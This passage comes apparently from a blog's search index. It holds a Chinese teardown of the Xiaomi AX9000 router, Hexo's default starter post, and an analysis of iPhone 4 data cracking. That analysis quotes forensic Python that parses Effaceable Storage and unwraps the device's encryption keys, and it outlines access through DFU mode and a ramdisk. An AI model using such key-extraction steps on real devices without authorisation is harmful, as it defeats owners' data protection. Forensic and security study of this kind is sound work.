4，分别连接4根外置天线。滤波器就不需要了</li>\n</ul>\n<h3 id=\"AIoT通信模组\"><a href=\"#AIoT通信模组\" class=\"headerlink\" title=\"AIoT通信模组\"></a>AIoT通信模组</h3><ul>\n<li>无线芯片：Qualcomm QCA9889 * 1，低档配置，仅支持802.11ac协议，不支持MIMO；2.4G最高速率150Mbps，5G是高速率433Mbps</li>\n<li>射频前端：无，连接1根内置双频天线</li>\n</ul>\n<h3 id=\"其他辅助芯片\"><a href=\"#其他辅助芯片\" class=\"headerlink\" title=\"其他辅助芯片\"></a>其他辅助芯片</h3><ul>\n<li>Qualcomm QCA8075 * 1：负责连接5个千兆以太网的物理接口</li>\n<li>Qualcomm QCA8081 * 1：负责连接2.5G的双链路聚合LAN口，由用户决定用于WAN或者LAN</li>\n<li>Qualcomm PMP8074 * 1：与高通CPU配套的电源管理芯片，负责管理CPU的供电</li>\n</ul>\n<blockquote>\n<p>AX9000有三组无线芯片，每组均有4个FEM芯片和4根外置天线，这就是“三频路由器”的原因<br>FEM，Front-end Modules，即就是前端模块，负责射频信号的发送放大以及接收放大、滤波，甚至包含功率检测、控制和开关等作用。主流厂家包括美国的Skyworks、Qorvo，台湾的Richwave，国内的康希通信。<br>AIoT就是个垃圾！只负责米家智能设备的自动接入和同步资料，其他终端设备均无法使用，刷刷数据还要涨价！</p>\n</blockquote>\n<h2 id=\"三、天线组件\"><a href=\"#三、天线组件\" class=\"headerlink\" title=\"三、天线组件\"></a>三、天线组件</h2><h3 id=\"外置天线\"><a href=\"#外置天线\" class=\"headerlink\" title=\"外置天线\"></a>外置天线</h3><p>小米AX9000共有12根外置天线，在顶部分为4组，每组包含2.4GHz、5.2GHz和5.8GHz各1根。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/%E5%9B%9B%E6%A0%B9%E5%A4%A9%E7%BA%BF.jpg\" class=\"\">\n\n<p>小米把5.2GHz称为电竞频段5G_GAME，理由是有160MHz带宽，哪家的路由器不是这个参数呢？<br>两根5G天线的位置分开，且PCB天线的平面是相互垂直的，这样布局倒是有利于减少干扰。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/%E5%A4%A9%E7%BA%BF.jpeg\" class=\"\">\n\n<p>三频路由器对于Mesh组网有帮助。在没有有线回程的情况下，如果使用两台AX9000组网，可以利用完整的5.2G频段承担起无线回程的重任，保证接入的终端设备可以全带宽运行；但是如果其中一台是双频路由器的话，就只能分享5G频段了。</p>\n<h3 id=\"AIoT天线\"><a href=\"#AIoT天线\" class=\"headerlink\" title=\"AIoT天线\"></a>AIoT天线</h3><img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/AIoT%E5%A4%A9%E7%BA%BF.jpg\" class=\"\">\n\n<p>红色框里的是AIoT天线，贴在机身内侧，是双频天线。据说位置有讲究，与相邻的2.4G不能近于15CM，与5G不能近于7CM。</p>\n<h2 id=\"四、全产品矩阵\"><a href=\"#四、全产品矩阵\" class=\"headerlink\" title=\"四、全产品矩阵\"></a>四、全产品矩阵</h2><h3 id=\"主流产品\"><a href=\"#主流产品\" class=\"headerlink\" title=\"主流产品\"></a>主流产品</h3><table>\n<thead>\n<tr>\n<th align=\"center\">型号</th>\n<th align=\"center\">定位</th>\n<th align=\"center\">售价</th>\n<th align=\"center\">性能参数</th>\n<th align=\"center\">备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">小米AX9000</td>\n<td align=\"center\">旗舰</td>\n<td align=\"center\">1299</td>\n<td align=\"center\">IPQ8072A，1GB，QCN5024 + QCN9024 + QCN5054 <br> 外置天线12根，1147+2402+4804+583</td>\n<td align=\"center\">唯一的三频路由器</td>\n</tr>\n<tr>\n<td align=\"center\">小米AX6000</td>\n<td align=\"center\">中档</td>\n<td align=\"center\">599</td>\n<td align=\"center\">IPQ5018，512MB，QCN9024 <br> 外置天线6+1根，574+4804+583</td>\n<td align=\"center\">小米AX3600的马甲</td>\n</tr>\n<tr>\n<td align=\"center\">小米AX3000</td>\n<td align=\"center\">入门</td>\n<td align=\"center\">349</td>\n<td align=\"center\">IPQ5000，256MB，QCN6102 <br> 隐藏天线4根，574+2402</td>\n<td align=\"center\">红米同款的颜值货</td>\n</tr>\n<tr>\n<td align=\"center\">红米AX5400</td>\n<td align=\"center\">中档</td>\n<td align=\"center\">399</td>\n<td align=\"center\">IPQ5018，512MB，QCN9024 <br> 外置天线6根，574+4804</td>\n<td align=\"center\">红米AX6的马甲</td>\n</tr>\n<tr>\n<td align=\"center\">红米AX3000</td>\n<td align=\"center\">实惠</td>\n<td align=\"center\">269</td>\n<td align=\"center\">IPQ5000，256MB，QCN6102 <br> 外置天线4根，574+2402</td>\n<td align=\"center\"><a href=\"%E7%BA%A2%E7%B1%B3AX3000.jpg\">从节点的首选</a></td>\n</tr>\n</tbody></table>\n<ol>\n<li>关于核心CPU，中低档路由器均采用<a href=\"IPQ5x.png\">高通5x系列</a>，2核A53+1核NPU，而且内部集成2.4GHz Wi-Fi6也需要消耗CPU资源。<br>相比之下，AX9000采用的8x系列，4核A53+2核NPU，性能更强悍，且每个频段都有独立无线芯片，因此主板带宽充足，有效解决吞吐量瓶颈。</li>\n<li>关于5GHz频段，中档路由器采用1个QCN9024（高通旗舰QCN9074阉割了6GHz功能的高档货），低档采用1个QCN6012，因此都是双频路由器。<br>相比之下，AX9000的5.2GHz频段也是QCN9024，但5.8GHz频段的无线芯片采用5x系列，比中档路由器的6x系列更差，有偷工减料的嫌疑；而且QCN5024似乎仅支持2*2 MIMO，难道宣传2.4GHz的1147Mbps是假的？</li>\n<li>关于天线，中低档路由器2.4GHz的天线都是2根，仅支持2 * 2 MIMO，区别是在5GHz频段，低档是2根天线支持2 * 2 MIMO；中档是4根天线支持4 * 4 MIMO。</li>\n<li>关于内存，也是一个明显的区隔指标，分别是1024MB、512MB和256MB。</li>\n<li>好消息是，AX系列全部产品均支持Mesh组网！当然，必须都是小米品牌的。</li>\n</ol>\n<h3 id=\"其他产品\"><a href=\"#其他产品\" class=\"headerlink\" title=\"其他产品\"></a>其他产品</h3><ul>\n<li><strong>红米AX6S</strong>：MTK芯片的实验品，性能配置与红米AX6相当。黑色外套好区分，便宜20元。</li>\n<li><strong>红米电竞AX5400</strong>：红米AX5400的兄弟款，主打电竞市场的智商税；换个黑色外套和灯光，2个WAN口 + 2.5G的LAN口，但涨价200元。</li>\n<li><strong>小米AX3600</strong>：售价499元，曾经的性价比之王，已下架；替代品AX6000，将IPQ8071的CPU降档为IPQ5018，增加了几个然并L的智能家居、4*4 MIMO等功能，然后涨价100元！</li>\n<li><strong>红米AX6</strong>：CPU是IPQ8071，QCN5052+QCN5054的双无线芯片，配置模式很有AX9000的影子，可惜也下架了，少量存货加价300+</li>\n<li>其他早期下架产品还有：小米AX1800、红米AX1800、红米AX5等。</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.acwifi.net/13681.html\">小米AX9000三频无线路由器拆机</a></li>\n<li><a href=\"https://www.acwifi.net/12621.html\">小米AX6000拆机，拆完后开不了机</a></li>\n<li><a href=\"https://www.acwifi.net/15091.html\">红米AX3000拆机</a></li>\n<li><a href=\"https://www.acwifi.net/10272.html\">红米AX5拆机，不用看了跟小米AX1800一样</a></li>\n<li><a href=\"https://www.acwifi.net/11176.html\">红米AX6拆机，旧款WIFI6无线路由器</a></li>\n<li><a href=\"https://www.10bests.com/wifi6-routers-by-chip-qualcomm/\">高通芯片方案的Wi-Fi6路由器汇总和推荐</a></li>\n</ul>\n<h3 id=\"视频教材\"><a href=\"#视频教材\" class=\"headerlink\" title=\"视频教材\"></a>视频教材</h3><ul>\n<li><a href=\"https://www.ixigua.com/6973629022425055781?logTag=8860c8362a7f51e7d691\">小米AX9000高端功能及性能评测</a></li>\n<li><a href=\"https://www.ixigua.com/6900819345442603524?id=6958306910969791012&logTag=0781892ee341492262db\">小米路由器AX9000 无线mesh组网评测</a></li>\n</ul>\n"},{"title":"Hello World","url":"/2018/12/21/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\">Deployment</a></p>\n","tags":["hexo","default"]},{"title":"iPhone4 数据破解的技术分析","url":"/2024/01/10/iPhone4-%E6%95%B0%E6%8D%AE%E7%A0%B4%E8%A7%A3%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<p>Apple 起家的产品是个人电脑，操作系统是基于 BSD 的定制化Linux，使用的是 MFS 文件系统。</p>\n<p>1985年，Apple 发布了 HFS（Hierarchical File System）作为专用的文件系统，后续改进推出了 HFS+（扩展日志式）。HFS 的设计理念源自软盘和磁盘设备时代，为此饱受开发者吐槽，甚至被 Linus 痛斥为有史以来最烂的文件系统，突出的问题有以下几个方面：</p>\n<ul>\n<li>大小写不敏感（最新版本已支持大小写敏感，但默认配置仍未不敏感）</li>\n<li>不支持对数据内容进行 checksum 校验</li>\n<li>timestamp 只支持到秒级</li>\n<li>不支持并发访问，不支持快照，不支持 sparse file</li>\n<li>使用 big-endian 进行存储</li>\n</ul>\n<p>2007年，乔布斯发布了第一代 iPhone，其搭载的操作系统称为 iOS，而个人电脑的操作系统被称为 MacOS。由于 iOS 其实是 MacOS 的一个定制化版本，HFS 只能提供类似 FDE 的全盘加密技术，无法在底层提供文件级别的数据加密能力，许多新功能只能基于上层文件的数据结构，以软件补丁的形式强行实现，开发效率和安全性存在严重隐患。</p>\n<blockquote>\n<p>对比 Android 系统，早期采用的<strong>FDE（Full-Disk Encryption）</strong>模式也是一种基于 Volume 的全盘加密技术；从 Android 7 开始，推出 <strong>FBE（File-based Encryption）</strong>模式可以支持文件级别的数据加密，但技术可靠性一直问题多多，直到 Android 13 才基本成熟并取消 FDE 模式的支持，这也从另一个角度说明数据保护技术的复杂性。</p>\n</blockquote>\n<p>2014年，在 Giampaolo 的带领下，Apple启动了APFS（Apple File System）项目研发，并于2017年首次发布，短板终于修补上了！APFS号称是针对SSD等新型设备专门设计（也兼容传统硬盘），提供Copy-on-Write、系统快照、动态分区调整、稀疏大文件支持等功能，但与业界最优秀的ZFS相比并无优势，唯一值得表扬的是，结合Apple封闭硬件体系的优势，执法机构再也没法提取iPhone 的个人数据了。</p>\n<p>需要注意的是，以下研究分析大多是基于 iOS 5 之前的版本，随着 iPhone 数据保护技术的多次演进，许多代码已经无法运行，但其技术原理是一脉相承的，仍然具备足够的参考价值。</p>\n<h2 id=\"一、文件系统的元数据-metadata\"><a href=\"#一、文件系统的元数据-metadata\" class=\"headerlink\" title=\"一、文件系统的元数据 - metadata\"></a>一、文件系统的元数据 - metadata</h2><p>所有 Linux 的文件系统都是 superblock , inode 和 block 的组合。</p>\n<ul>\n<li>superblock：记录此 filesystem 的整体信息,包括inode&#x2F;block的总量、使用量、剩余量, 以及文件系统的格式与相关信息等</li>\n<li>inode table：记录文件的权限与属性,一个文件占用一个inode,同时记录此文件的数据所在的 block 号码</li>\n<li>data block：实际记录文件的内容,若文件太大时,会占用多个 block</li>\n</ul>\n<h3 id=\"1-inode-的数据结构\"><a href=\"#1-inode-的数据结构\" class=\"headerlink\" title=\"1. inode 的数据结构\"></a>1. inode 的数据结构</h3><p>Apple 公开了操作系统的部分源代码，可以发现 HFS 仅仅是将 inode 改名为 cnode，但增加了一个 <code>c_cpentry</code> 字段用于数据保护。<br>请参见<a href=\"https://opensource.apple.com/source/xnu/xnu-1699.32.7/bsd/hfs/hfs_cnode.h\">https://opensource.apple.com/source/xnu/xnu-1699.32.7/bsd/hfs/hfs_cnode.h</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * The cnode is used to represent each active (or recently active)</span></span><br><span class=\"line\"><span class=\"comment\"> * file or directory in the HFS filesystem.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Reading or writing any of these fields requires holding c_lock.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cnode</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">lck_rw_t</span>        c_rwlock;               <span class=\"comment\">/* cnode&#x27;s lock */</span></span><br><span class=\"line\">    <span class=\"type\">void</span>            *c_lockowner;           <span class=\"comment\">/* cnode&#x27;s lock owner (exclusive case only) */</span></span><br><span class=\"line\">    <span class=\"type\">lck_rw_t</span>        c_truncatelock;         <span class=\"comment\">/* protects file from truncation during read/write */</span></span><br><span class=\"line\">    <span class=\"type\">void</span>            *c_truncatelockowner;   <span class=\"comment\">/* truncate lock owner (exclusive case only) */</span></span><br><span class=\"line\">    LIST_ENTRY(cnode)   c_hash;             <span class=\"comment\">/* cnode&#x27;s hash chain */</span></span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>       c_flag;                 <span class=\"comment\">/* cnode&#x27;s runtime flags */</span></span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>       c_hflag;                <span class=\"comment\">/* cnode&#x27;s flags for maintaining hash - protected by global hash lock */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vnode</span>    *<span class=\"title\">c_vp</span>;</span>                  <span class=\"comment\">/* vnode for data fork or dir */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vnode</span>    *<span class=\"title\">c_rsrc_vp</span>;</span>             <span class=\"comment\">/* vnode for resource fork */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">dquot</span>    *<span class=\"title\">c_dquot</span>[<span class=\"title\">MAXQUOTAS</span>];</span>    <span class=\"comment\">/* cnode&#x27;s quota info */</span></span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>       c_childhint;            <span class=\"comment\">/* catalog hint for children (small dirs only) */</span></span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>       c_dirthreadhint;        <span class=\"comment\">/* catalog hint for directory&#x27;s thread rec */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cat_desc</span> <span class=\"title\">c_desc</span>;</span>                 <span class=\"comment\">/* cnode&#x27;s descriptor */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cat_attr</span> <span class=\"title\">c_attr</span>;</span>                 <span class=\"comment\">/* cnode&#x27;s attributes */</span></span><br><span class=\"line\">    TAILQ_HEAD(hfs_originhead, linkorigin) c_originlist;  <span class=\"comment\">/* hardlink origin cache */</span></span><br><span class=\"line\">    TAILQ_HEAD(hfs_hinthead, directoryhint) c_hintlist;  <span class=\"comment\">/* readdir directory hint list */</span></span><br><span class=\"line\">    <span class=\"type\">int16_t</span>         c_dirhinttag;           <span class=\"comment\">/* directory hint tag */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">        <span class=\"type\">int16_t</span>     cu_dirhintcnt;          <span class=\"comment\">/* directory hint count */</span></span><br><span class=\"line\">        <span class=\"type\">int16_t</span>     cu_syslockcount;        <span class=\"comment\">/* system file use only */</span></span><br><span class=\"line\">    &#125; c_union;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>       c_dirchangecnt;         <span class=\"comment\">/* changes each insert/delete (in-core only) */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">filefork</span> *<span class=\"title\">c_datafork</span>;</span>            <span class=\"comment\">/* cnode&#x27;s data fork */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">filefork</span> *<span class=\"title\">c_rsrcfork</span>;</span>            <span class=\"comment\">/* cnode&#x27;s rsrc fork */</span></span><br><span class=\"line\">    <span class=\"type\">atomicflag_t</span>    c_touch_acctime;</span><br><span class=\"line\">    <span class=\"type\">atomicflag_t</span>    c_touch_chgtime;</span><br><span class=\"line\">    <span class=\"type\">atomicflag_t</span>    c_touch_modtime;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> HFS_COMPRESSION</span></span><br><span class=\"line\">    decmpfs_cnode  *c_decmp;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">/* HFS_COMPRESSION */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> CONFIG_PROTECT</span></span><br><span class=\"line\">    <span class=\"type\">cprotect_t</span>      c_cpentry;              <span class=\"comment\">/* content protection data */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-cprotect-的数据结构\"><a href=\"#2-cprotect-的数据结构\" class=\"headerlink\" title=\"2. cprotect 的数据结构\"></a>2. cprotect 的数据结构</h3><p>进一步分析 <code>cprotect</code> 的数据结构，包含了文件独有密钥 <code>cp_persistent_key</code>（密文）和类标记 <code>cp_pclass</code>，并且有持久化存储和运行态的两种格式。<br>请参见<a href=\"https://opensource.apple.com/source/xnu/xnu-1699.32.7/bsd/sys/cprotect.h\">https://opensource.apple.com/source/xnu/xnu-1699.32.7/bsd/sys/cprotect.h</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cprotect</span> *<span class=\"title\">cprotect_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * Runtime-only structure containing the content protection status </span></span><br><span class=\"line\"><span class=\"comment\"> * for the given file.  This is contained within the cnode </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cprotect</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>     cp_cache_key[CP_KEYSIZE];</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>     cp_persistent_key[CP_WRAPPEDKEYSIZE];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    cp_flags;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span>    cp_pclass;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * On-disk structure written as the per-file EA payload </span></span><br><span class=\"line\"><span class=\"comment\"> * All on-disk multi-byte fields for the CP XATTR must be stored</span></span><br><span class=\"line\"><span class=\"comment\"> * little-endian on-disk.  This means they must be endian swapped to</span></span><br><span class=\"line\"><span class=\"comment\"> * L.E on getxattr() and converted to LE on setxattr().</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cp_xattr</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">u_int16_t</span>   xattr_major_version;</span><br><span class=\"line\">    <span class=\"type\">u_int16_t</span>   xattr_minor_version;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   flags;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   persistent_class;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   key_size;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span>     persistent_key[CP_WRAPPEDKEYSIZE];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Same is true for the root EA, all fields must be written little endian. */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">cp_root_xattr</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">u_int16_t</span>   major_version;</span><br><span class=\"line\">    <span class=\"type\">u_int16_t</span>   minor_version;</span><br><span class=\"line\">    <span class=\"type\">u_int64_t</span>   flags;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   reserved1;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   reserved2;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   reserved3;</span><br><span class=\"line\">    <span class=\"type\">u_int32_t</span>   reserved4;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、核心密钥提取\"><a href=\"#二、核心密钥提取\" class=\"headerlink\" title=\"二、核心密钥提取\"></a>二、核心密钥提取</h2><p>Github 上有一个取证软件包可以读取早期的 iOS 系统数据。请参见<a href=\"https://github.com/nabla-c0d3/iphone-dataprotection\">https://github.com/nabla-c0d3/iphone-dataprotection</a>。<br>基本原理是通过加载修改后的 IPSW 固件，将设备强制进入 DFU 模式，然后通过 SSH 命令行连接到恢复内存盘 (Restore Ramdisk)，从而直接获取系统控制权。<br>这些工具只能适配 iPhone 4 （iOS 5）之前的版本，随后苹果公司升级软件就无法越狱了。</p>\n<p>其中有一段 Python 代码用于读取<code>Effaceable Storge</code> 的三个核心密钥，文件路径是 <code>python_scripts/keystore/effaceable.py</code></p>\n<figure class=\"highlight py\"><table><tr><td class=\"code\"><pre><span class=\"line\">Dkey = <span class=\"number\">0x446B6579</span></span><br><span class=\"line\">EMF = <span class=\"number\">0x454D4621</span></span><br><span class=\"line\">BAG1 = <span class=\"number\">0x42414731</span></span><br><span class=\"line\">DONE = <span class=\"number\">0x444f4e45</span>   <span class=\"comment\">#locker sentinel</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Effaceable Stroge 的数据结构</span></span><br><span class=\"line\"><span class=\"comment\"># MAGIC (kL) | LEN (2bytes) | TAG (4) | DATA (LEN)</span></span><br><span class=\"line\">Locker = Struct(<span class=\"string\">&quot;Locker&quot;</span>,</span><br><span class=\"line\">                String(<span class=\"string\">&quot;magic&quot;</span>,<span class=\"number\">2</span>),</span><br><span class=\"line\">                ULInt16(<span class=\"string\">&quot;length&quot;</span>),</span><br><span class=\"line\">                <span class=\"type\">Union</span>(<span class=\"string\">&quot;tag&quot;</span>,</span><br><span class=\"line\">                      ULInt32(<span class=\"string\">&quot;int&quot;</span>),</span><br><span class=\"line\">                      String(<span class=\"string\">&quot;tag&quot;</span>,<span class=\"number\">4</span>))</span><br><span class=\"line\">                ,</span><br><span class=\"line\">                String(<span class=\"string\">&quot;data&quot;</span>, <span class=\"keyword\">lambda</span> ctx: ctx[<span class=\"string\">&quot;length&quot;</span>])</span><br><span class=\"line\">                )</span><br><span class=\"line\"></span><br><span class=\"line\">Lockers = RepeatUntil(<span class=\"keyword\">lambda</span> obj, ctx: obj.tag.<span class=\"built_in\">int</span> == DONE, Locker)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">EffaceableLockers</span>(<span class=\"title class_ inherited__\">object</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, data</span>):</span><br><span class=\"line\">        self.lockers = &#123;&#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> l <span class=\"keyword\">in</span> Lockers.parse(data):</span><br><span class=\"line\">            tag = l.tag.<span class=\"built_in\">int</span> &amp; ~<span class=\"number\">0x80000000</span></span><br><span class=\"line\">            tag = struct.pack(<span class=\"string\">&quot;&lt;L&quot;</span>, tag)[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">            self.lockers[tag] = l.data</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 获取 DKey，使用 AESUnwrap 算法解包</span></span><br><span class=\"line\">    <span class=\"comment\"># 注意！ Python 的 AESUnwrap 函数的入参顺序与 RFC 3394 规范正好相反</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">get_DKey</span>(<span class=\"params\">self, k835</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.lockers.has_key(<span class=\"string\">&quot;Dkey&quot;</span>):        </span><br><span class=\"line\">            <span class=\"keyword\">return</span> AESUnwrap(k835, self.lockers[<span class=\"string\">&quot;Dkey&quot;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 获取 EMF，很明显兼容了 LwVM，使用 AESdecryptCBC 算法解密</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">get_EMF</span>(<span class=\"params\">self, k89b</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.lockers.has_key(<span class=\"string\">&quot;LwVM&quot;</span>):</span><br><span class=\"line\">            lwvm = AESdecryptCBC(self.lockers[<span class=\"string\">&quot;LwVM&quot;</span>], k89b)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> lwvm[-<span class=\"number\">32</span>:]</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> self.lockers.has_key(<span class=\"string\">&quot;EMF!&quot;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> AESdecryptCBC(self.lockers[<span class=\"string\">&quot;EMF!&quot;</span>][<span class=\"number\">4</span>:], k89b)</span><br></pre></td></tr></table></figure>\n\n<p>下图是 Effaceable Stroge 的数据示例，但是由于版本不同，与上面的 Python 代码并不一致。<br>浅蓝色是 length ，红色是 tag 标记，注意HFS 是大端字节顺序。<br>第一个标记：0x42414731 &#x3D; <code>BAG1</code>，长度 0x0034 &#x3D; 52 个字节<br>第二个标记：0xC46B6579 &#x3D; <code>key</code>，长度 0x0028 &#x3D; 40 个字节<br>第三个标记：0xC54D4621 &#x3D; <code>EMF!</code>，长度 0x0024 &#x3D; 36 个字节<br>第四个标记：0x444F4E45 &#x3D; <code>DONE</code>，长度 0x0000，这就是结束了！</p>\n<p><img src=\"/2024/01/10/iPhone4-%E6%95%B0%E6%8D%AE%E7%A0%B4%E8%A7%A3%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/plog.png\" alt=\"plog\"></p>\n<h2 id=\"三、设备密钥包-Device-Bag\"><a href=\"#三、设备密钥包-Device-Bag\" class=\"headerlink\" title=\"三、设备密钥包 - Device Bag\"></a>三、设备密钥包 - Device Bag</h2><p>系统密钥包是一个加密的 <code>plist</code> 格式的二进制文件，存储了所有类密钥的数据，Apple 系统的数据解密实现方式见下图。</p>\n<p><img src=\"/2024/01/10/iPhone4-%E6%95%B0%E6%8D%AE%E7%A0%B4%E8%A7%A3%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/daemon.png\" alt=\"Daemon\"></p>\n<p>基于上面的取证工具包，找到了一个读取设备密钥包的小工具。<br>请参见<a href=\"https://github.com/russtone/systembag.kb\">https://github.com/russtone/systembag.kb</a> 。</p>\n<h3 id=\"1-Device-Bag-的文件级解密\"><a href=\"#1-Device-Bag-的文件级解密\" class=\"headerlink\" title=\"1. Device Bag 的文件级解密\"></a>1. Device Bag 的文件级解密</h3><p>系统密钥包的默认存储路径是 <code>/private/var/keybags/systembag.kb</code>，如果是U盘引导启动，可能位于<code>/mnt/keybags/systembag.kb</code>。<br>参考其操作步骤，Device Bag 文件解封的处理流程是：</p>\n<ol>\n<li>安全隔区从<code>Effaceable Storage</code> 区域提取 <code>BAG1</code> ，以获得 key 和 